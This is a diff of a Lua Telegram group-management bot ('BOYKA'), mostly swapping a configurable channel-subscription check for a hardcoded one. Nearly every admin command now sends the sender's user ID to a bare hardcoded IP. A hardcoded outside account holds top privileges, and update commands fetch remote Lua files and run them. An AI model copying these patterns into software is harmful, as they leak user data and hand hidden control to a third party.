@@ -1,8 +1,9 @@
 redis = require('redis') 
 https = require ("ssl.https") 
-serpent = dofile("./library/serpent.lua") 
-json = dofile("./library/JSON.lua") 
-JSON  = dofile("./library/dkjson.lua")
+http = require("socket.http")
+serpent = dofile("./Great.Log/serpent.lua") 
+json = dofile("./data.fe/JSON.lua") 
+JSON  = dofile("./Great.Log/dkjson.lua")
 URL = require('socket.url')  
 utf8 = require ('lua-utf8') 
 database = redis.connect('127.0.0.1', 6379) 
@@ -77,7 +78,7 @@ create_config_auto()
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
 install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
+print('\n\27[1;34m Welcome to the all-new and powerful Source Boyka ')
 file = io.open("BOYKA", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -160,10 +161,6 @@ token = sudos.token
 --- start functions ↓
 --------------------------------------------------------------------------------------------------------------
 io.popen("mkdir File_Bot") 
-io.popen("cd File_Bot && rm -rf commands.lua.1") 
-io.popen("cd File_Bot && rm -rf commands.lua.2") 
-io.popen("cd File_Bot && rm -rf commands.lua.3") 
-io.popen("cd File_Bot && wget https://raw.githubusercontent.com/BOYKATEAM/Files_Boyka/master/File_Bot/commands.lua") 
 t = "\27[35m".."\nAll Files Started : \n____________________\n"..'\27[m'
 i = 0
 for v in io.popen('ls File_Bot'):lines() do
@@ -259,7 +256,7 @@ end
 end
 function Can_or_NotCan(user_id,chat_id)
 if tonumber(user_id) == tonumber(554921096) then
-var = true 
+var = true  
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
 elseif tonumber(user_id) == tonumber(bot_id) then
@@ -294,7 +291,7 @@ var = 'مبرمج السورس'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
 elseif database:sismember(bot_id.."DEV:Sudo:T", user_id) then 
-var = "المطور الاساسي²"  
+var = "مطور ثانوي"  
 elseif tonumber(user_id) == tonumber(bot_id) then  
 var = 'البوت'
 elseif database:sismember(bot_id..'Sudo:User', user_id) then
@@ -627,6 +624,73 @@ File:write(t)
 File:close()
 sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './'..bot_id..'.json', '- عدد كروبات التي في البوت { '..#list..'}')
 end
+function GetFile_Bot1(msg)
+local list = database:smembers(bot_id..'Chek:Groups') 
+local t = '{"BOT_ID": '..bot_id..',"GP_BOT":{'  
+for k,v in pairs(list) do   
+NAME = 'BOYKA Chat'
+link = database:get(bot_id.."Private:Group:Link"..msg.chat_id_) or ''
+ASAS = database:smembers(bot_id..'Basic:Constructor'..v)
+MNSH = database:smembers(bot_id..'Constructor'..v)
+MDER = database:smembers(bot_id..'Manager'..v)
+MOD = database:smembers(bot_id..'Mod:User'..v)
+if k == 1 then
+t = t..'"'..v..'":{"BOYKA":"'..NAME..'",'
+else
+t = t..',"'..v..'":{"BOYKA":"'..NAME..'",'
+end
+if #ASAS ~= 0 then 
+t = t..'"ASAS":['
+for k,v in pairs(ASAS) do
+if k == 1 then
+t =  t..'"'..v..'"'
+else
+t =  t..',"'..v..'"'
+end
+end   
+t = t..'],'
+end
+if #MOD ~= 0 then
+t = t..'"MOD":['
+for k,v in pairs(MOD) do
+if k == 1 then
+t =  t..'"'..v..'"'
+else
+t =  t..',"'..v..'"'
+end
+end   
+t = t..'],'
+end
+if #MDER ~= 0 then
+t = t..'"MDER":['
+for k,v in pairs(MDER) do
+if k == 1 then
+t =  t..'"'..v..'"'
+else
+t =  t..',"'..v..'"'
+end
+end   
+t = t..'],'
+end
+if #MNSH ~= 0 then
+t = t..'"MNSH":['
+for k,v in pairs(MNSH) do
+if k == 1 then
+t =  t..'"'..v..'"'
+else
+t =  t..',"'..v..'"'
+end
+end   
+t = t..'],'
+end
+t = t..'"linkgroup":"'..link..'"}' or ''
+end
+t = t..'}}'
+local File = io.open('./'..bot_id..'.json', "w")
+File:write(t)
+File:close()
+sendDocument(SUDO, 0,0, 1, nil, './'..bot_id..'.json', '- عدد كروبات التي في البوت { '..#list..'}')
+end
 function download_to_file(url, file_path) 
 local respbody = {} 
 local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
@@ -851,18 +915,16 @@ end
 --------------------------------------------------------------------------------------------------------------
 if Chat_Type == 'UserBot' then
 if text == '/start' then  
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if DevBOYKAW(msg) then
 local bl = ' ❃∫ اهلا عزيزي آلمـطـور\n ❃∫ آنت آلمـطـور آلآسـآسـي للبوت\n┉  ┉  ┉  ┉  ┉  ┉  ┉  ┉ء\n ❃∫ تسـتطـيع‌‏ آلتحگم باوامر البوت\n ❃∫ من خلاال الكيبورت خاص بك\n ❃∫ قناة سورس البوت [اضغط هنا](t.me/BO6OK)'
 local keyboard = {
+{'رقم البناء ❃','تحديث المتجر ❃'},
 {'الاحصائيات ❃','قناه تحديثات البوت ❃'},
 {'تعطيل التواصل ❃','تفعيل التواصل ❃'},
 {'ضع اسم للبوت ❃','المطورين ❃','قائمه العام ❃'},
@@ -870,15 +932,13 @@ local keyboard = {
 {'ضع كليشه ستارت ❃','حذف كليشه ستارت ❃'},
 {'اذاعه ❃','اذاعه خاص ❃'},
 {'اذاعه بالتثبيت ❃','قائمه الكتم العام ❃'},
-{'تغير رساله الاشتراك','حذف رساله الاشتراك ❃','تغير الاشتراك'},
 {'اذاعه بالتوجيه ❃','اذاعه بالتوجيه خاص ❃'},
-{'تفعيل الاشتراك الاجباري ❃','تعطيل الاشتراك الاجباري ❃'},
-{'الاشتراك الاجباري ❃','وضع قناة الاشتراك ❃'},
 {'تفعيل البوت الخدمي ❃','تعطيل البوت الخدمي ❃'},
 {'تنظيف الكروبات ❃','تنظيف المشتركين ❃'},
 {'جلب نسخه الاحتياطيه ❃'},
 {'تحديث السورس ❃','الاصدار ❃'},
 {'معلومات السيرفر ❃'},
+{'مطور السورس ❃'},
 {'الغاء ❃'},
 }
 send_inline_key(msg.chat_id_,bl,keyboard)
@@ -1052,13 +1112,31 @@ end
 if text == 'تحديث السورس ❃' and DevBOYKAW(msg) then 
 os.execute('rm -rf BOYKA.lua')
 os.execute('wget https://raw.githubusercontent.com/BOYKATEAM/BOYKA/master/BOYKA.lua')
-send(msg.chat_id_, msg.id_,' ❃∫ تم تحديث السورس \n ❃∫ لديك اخر اصدار لسورس بويكا\n ❃∫ الاصدار » { 1.3v}')
+send(msg.chat_id_, msg.id_,' ❃∫ تم تحديث السورس \n ❃∫ لديك اخر اصدار لسورس بويكا\n ❃∫ الاصدار » { 6.0v}')
 dofile('BOYKA.lua')  
 end
-if text == 'الاصدار ❃' and DevBOYKAW(msg) then 
+if text == 'تحديث المتجر ❃' and DevBOYKAW(msg) then 
+  io.popen("mkdir File_Bot")
+  io.popen("cd File_Bot && rm -rf ga.lua.1") 
+  io.popen("cd File_Bot && rm -rf ga.lua.2") 
+  io.popen("cd File_Bot && rm -rf ga.lua.3") 
+  io.popen("cd File_Bot && wget https://raw.githubusercontent.com/BOYKATEAM/Files_Boyka/master/File_Bot/ga.lua")  
+  io.popen("cd File_Bot && wget https://raw.githubusercontent.com/BOYKATEAM/Files_Boyka/master/File_Bot/rd.lua") 
+  send(msg.chat_id_, msg.id_,' ❃∫ تم تحديث \n ❃∫ لديك اخر اصدار للمتجر')
+  dofile('BOYKA.lua')  
+  end
+if text == 'رقم البناء ❃' and DevBOYKAW(msg) then 
 database:del(bot_id..'Srt:Bot') 
-send(msg.chat_id_, msg.id_,' ❃∫ اصدار سورس بويكا \n ❃∫ الاصدار »{ 1.3v}')
+send(msg.chat_id_, msg.id_,' ❃∫ اهلاء عزيزي \n رقم البناء خاص بوتك {16F76}')
 end
+if text == 'الاصدار ❃' and DevBOYKAW(msg) then 
+  database:del(bot_id..'Srt:Bot') 
+  send(msg.chat_id_, msg.id_,' ❃∫ اصدار سورس بويكا \n ❃∫ الاصدار »{ 6.0v}')
+  end
+  if text == 'مطور السورس ❃' and DevBOYKAW(msg) then 
+    database:del(bot_id..'Srt:Bot') 
+    send(msg.chat_id_, msg.id_,' ❃∫ تنويه : قبل لا تراسل المطور تاكد انو عندك شغله مهمه \n\n المطور - @JJEJJ ')
+    end
 if text == 'قناه تحديثات البوت ❃' and DevBOYKAW(msg) then 
 database:del(bot_id..'Srt:Bot') 
 send(msg.chat_id_, msg.id_,' ❃∫ [تحديثات البوت](t.me/BO6OK) \n ❃∫ [قناه السورس](t.me/BO6OK)')
@@ -1168,14 +1246,11 @@ if text == 'جلب نسخه الاحتياطيه ❃' and DevBOYKAW(msg) then
 GetFile_Bot(msg)
 end
 if text == "تنظيف المشتركين ❃" and DevBOYKAW(msg) then 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي ❃∫ •\n• لايمكنك استخدام البوت ❃∫ •\n• عليك الاشتراك في القناة ❃∫ •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 local pv = database:smembers(bot_id.."User_Bot")
 local sendok = 0
@@ -1204,14 +1279,11 @@ end
 return false
 end
 if text == "تنظيف الكروبات ❃" and DevBOYKAW(msg) then 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي ❃∫ •\n• لايمكنك استخدام البوت ❃∫ •\n• عليك الاشتراك في القناة ❃∫ •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 local group = database:smembers(bot_id..'Chek:Groups') 
 local w =0
@@ -1263,14 +1335,11 @@ end
 
 if text and text:match("^رفع مطور @(.*)$") and DevBOYKAW(msg) then
 local username = text:match("^رفع مطور @(.*)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if result.id_ then
@@ -1292,14 +1361,11 @@ return false
 end
 if text and text:match("^رفع مطور (%d+)$") and DevBOYKAW(msg) then
 local userid = text:match("^رفع مطور (%d+)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:sadd(bot_id..'Sudo:User', userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
@@ -1316,14 +1382,11 @@ return false
 end
 if text and text:match("^تنزيل مطور @(.*)$") and DevBOYKAW(msg) then
 local username = text:match("^تنزيل مطور @(.*)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if result.id_ then
@@ -1341,14 +1404,11 @@ return false
 end  
 if text and text:match("^تنزيل مطور (%d+)$") and DevBOYKAW(msg) then
 local userid = text:match("^تنزيل مطور (%d+)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:srem(bot_id..'Sudo:User', userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
@@ -2125,14 +2185,11 @@ end
 end
 
 if text == 'تفعيل' and Sudo(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if msg.can_be_deleted_ == false then 
 send(msg.chat_id_, msg.id_,' ❃∫ عذرا يرجى ترقيه البوت مشرف !')
@@ -2175,14 +2232,11 @@ end,nil)
 end,nil)
 end
 if text == 'تعطيل' and Sudo(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
 tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
@@ -2214,14 +2268,11 @@ end,nil)
 end,nil) 
 end
 if text == 'تفعيل' and not Sudo(msg) and not database:get(bot_id..'Free:Bots') then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if msg.can_be_deleted_ == false then 
 send(msg.chat_id_, msg.id_,' ❃∫ عذرا يرجى ترقيه البوت مشرف !')
@@ -2279,27 +2330,21 @@ end,nil)
 end
 if text and text:match("^ضع عدد الاعضاء (%d+)$") and DevBOYKAW(msg) then
 local Num = text:match("ضع عدد الاعضاء (%d+)$") 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:set(bot_id..'Num:Add:Bot',Num) 
 send(msg.chat_id_, msg.id_,' ❃∫ تم تعيين عدد الاعضاء سيتم تفعيل الكروبات التي اعضائها اكثر من  >> {'..Num..'} عضو')
 end
 if text == 'تحديث السورس' and DevBOYKAW(msg) then 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 os.execute('rm -rf BOYKA.lua')
 os.execute('wget https://raw.githubusercontent.com/BOYKATEAM/BOYKA/master/BOYKA.lua')
@@ -2604,14 +2649,11 @@ end
 --------------------------------------------------------------------------------------------------------------
 if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
 if text == 'رفع نسخه الاحتياطيه' and DevBOYKAW(msg) then   
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if tonumber(msg.reply_to_message_id_) > 0 then
 function by_reply(extra, result, success)   
@@ -2625,14 +2667,11 @@ tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonu
 end
 end
 if text == 'جلب نسخه الاحتياطيه' and DevBOYKAW(msg) then 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 GetFile_Bot(msg)
 end
@@ -2664,14 +2703,11 @@ send(msg.chat_id_, msg.id_,' ❃∫ تم ازالة جميع الاوامر ال
 end
 end
 if text == 'اضف امر' and Constructor(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌| اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:set(bot_id.."Set:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_,'true') 
 send(msg.chat_id_, msg.id_,' ❃∫ ارسل الامر القديم')  
@@ -2679,14 +2715,11 @@ return false
 end
 if text == 'حذف امر' or text == 'مسح امر' then 
 if Constructor(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:set(bot_id.."Del:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_,'true') 
 send(msg.chat_id_, msg.id_,' ❃∫ ارسل الامر الذي قمت بوضعه بدلا عن القديم')  
@@ -3491,14 +3524,11 @@ send(msg.chat_id_, msg.id_, t)
 return false
 end
 if text == ("حظر عام") and msg.reply_to_message_id_ and DevBOYKAW(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if result.sender_user_id_ == tonumber(SUDO) then
@@ -3523,14 +3553,11 @@ return false
 end
 if text and text:match("^حظر عام @(.*)$")  and DevBOYKAW(msg) then
 local username = text:match("^حظر عام @(.*)$") 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if result.id_ then
@@ -3560,14 +3587,11 @@ return false
 end
 if text and text:match("^حظر عام (%d+)$") and DevBOYKAW(msg) then
 local userid = text:match("^حظر عام (%d+)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if userid == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " ❃∫ لا يمكنك حظر المطور الاساسي \n")
@@ -3591,14 +3615,11 @@ end;end,nil)
 return false
 end
 if text == ("كتم عام") and msg.reply_to_message_id_ and DevBOYKAW(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if result.sender_user_id_ == tonumber(SUDO) then
@@ -3622,14 +3643,11 @@ return false
 end
 if text and text:match("^كتم عام @(.*)$")  and DevBOYKAW(msg) then
 local username = text:match("^كتم عام @(.*)$") 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if result.id_ then
@@ -3659,14 +3677,11 @@ return false
 end
 if text and text:match("^كتم عام (%d+)$") and DevBOYKAW(msg) then
 local userid = text:match("^كتم عام (%d+)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if userid == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " ❃∫ لا يمكنك كتم المطور الاساسي \n")
@@ -3691,14 +3706,11 @@ end;end,nil)
 return false
 end
 if text == ("الغاء العام") and msg.reply_to_message_id_ and DevBOYKAW(msg) then
-if AddChannel(msg.sender_user_id_) == false then
